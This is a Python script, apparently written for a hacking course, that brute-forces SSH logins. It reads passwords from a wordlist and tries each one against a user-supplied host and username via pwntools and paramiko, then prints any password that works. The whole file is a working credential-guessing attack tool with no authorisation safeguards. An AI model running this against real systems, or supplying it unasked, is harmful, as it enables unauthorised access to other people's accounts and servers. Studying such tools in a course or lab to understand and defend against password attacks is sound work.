# This script performs SSH login brute forcing against a user-defined host address and username combination
# Logic is taken from the TCM Python 101 for Hackers course: https://academy.tcm-sec.com/p/python-101-for-hackers 

from pwn import *
import paramiko   # Python implementation of SSHv2 https://www.paramiko.org/
import sys

# Accept user input for the host IP address and username to brute force
if len(sys.argv) != 3:
	print("Please enter the host IP and username you wish to brute force.")
	print("Example usage: python3 {} 127.0.0.1 kali".format(sys.argv[0]))
	sys.exit()

# Assign the host and username combination from user input
host = sys.argv[1]
username = sys.argv[2]

# Create a counter for the number of authentication attempts performed
attempts = 0

# Open a predefined list of passwords and attempt an SSH login with each one
with open("ssh-common-passwords.txt", "r") as password_list:
	for password in password_list:
		password = password.strip("\n")  # Remove the newline character from each line
		try:
			print("[{}] Now attempting password: '{}'".format(attempts, password))

			# Attempt an SSH connection against the host/user, only wait 1 second until abandoning the attempt
			response = ssh(host=host, user=username, password=password, timeout=1)

			# If the connection succeeds, close the connection and break out of the loop
			if response.connected():
				print("[!!!] Valid password found: '{}'".format(password))
				response.close()
				break

			# Close the attempted SSH connection before the next brute force attempt
			response.close()

		# Catch the failed login attempts
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password!")

		# Increase the count of attempts performed
		attempts += 1 

password_list.close()